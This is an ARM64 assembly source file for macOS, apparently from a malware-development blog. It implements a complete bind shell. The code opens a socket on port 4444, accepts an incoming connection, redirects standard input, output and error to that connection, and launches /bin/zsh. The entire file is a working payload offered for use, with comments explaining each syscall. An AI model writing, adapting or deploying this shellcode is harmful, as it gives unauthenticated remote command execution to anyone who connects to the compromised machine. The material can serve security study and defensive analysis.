; hack.s
; bind shell ARM
; author: @cocomelonc
; https://cocomelonc.github.io/macos/2025/09/01/malware-mac-11.html
.global _start

.align 4
.section __TEXT,__text

_start:
  ; socket descriptor
  ; int socket(int domain, int type, int protocol)
  mov    x0, #2      ; domain = PF_INET
  mov    x1, #1      ; type = sock_stream
  mov    x2, xzr     ; protocol ipproto_ip

  mov    x16, #97    ; bsd syscall for socket (97)
  svc    #0xffff     ; exec syscall

  mov    x19, x0     ; save socket descriptor

  ; bind socket to local address
  ; int bind(int socket, const struct sockaddr_in *address, socklen_t address_len)
  mov    x2, #16                 ; address len (16 bytes)
  mov    x4, #0x0200             ; sin_len = 0, sin_family = 2
  movk   x4, #0x5c11, lsl#16     ; sin_port = 4444 = 0x115c
  stp    x4, xzr, [sp, #-16]!    ; push sockaddr_in to stack
  mov    x1, sp                  ; pointer to sockaddr_in struct
  mov    x16, #104               ; bsd syscall for bind (104)
  svc    #0xffff                 ; exec syscall

  ; listen incoming connections
  ; int listen(int socket, int backlog)
  mov    x0, x19           ; restore saved socket descriptor
  mov    x1, xzr           ; ingore address storage
  mov    x16, #106         ; bsd syscall for listen (106)
  svc    #0xffff           ; exec syscall

  ; accept incoming connections
  ; int accept(int socket, struct sockaddr *address, socklen_t *address_len)
  mov    x0, x19          ; restore saved socket descriptor
  mov    x1, xzr          ; ingore address storage
  mov    x2, xzr          ; ignore length of address struct
  mov    x16, #30         ; bsd syscall for accept (30)
  svc    #0xffff          ; exec syscall
  mov    x20, x0          ; save new socket descriptor

  ; dup2
  ; int dup2(int fd, int fd2)
  mov    x16, #90         ; bsd syscall dup2 (90)
  mov    x1, #2           ; file descriptor 2 = STDERR
  svc    #0xffff          ; execute syscall

  mov    x0, x20          ; restore new socket descriptor
  mov    x1, #1           ; file descriptor 1 = STDOUT
  svc    #0xffff          ; execute syscall

  mov    x0, x20          ; restore new socket descriptor
  lsr    x1, x1, #1       ; file descriptor 0 = STDIN
  svc    #0xffff          ; execute syscall

  ; launch shell via execve
  ; execve("/bin/zsh", ["/bin/zsh"], NULL)
  mov     x3, #0x622f          ; move "/bin/zsh" into x3 (little endian)
  movk    x3, #0x6e69, lsl#16  ;
  movk    x3, #0x7a2f, lsl#32  ;
  movk    x3, #0x6873, lsl#48  ;
  stp     x3, xzr, [sp,#-16]!  ; push path and terminating 0 to stack
  add     x0, sp, xzr          ; save pointer to path = argv[0] in x0
  stp     x0, xzr, [sp,#-16]!  ; push argv and terminating 0 to stack
  add     x1, sp, xzr          ; move pointer to argument array into X1
  mov     x2, xzr              ; third argument for execve ignored
  mov     x16, #59             ; bsd syscall for execve (59)
  svc     #0xffff              ; execute syscall to launch shell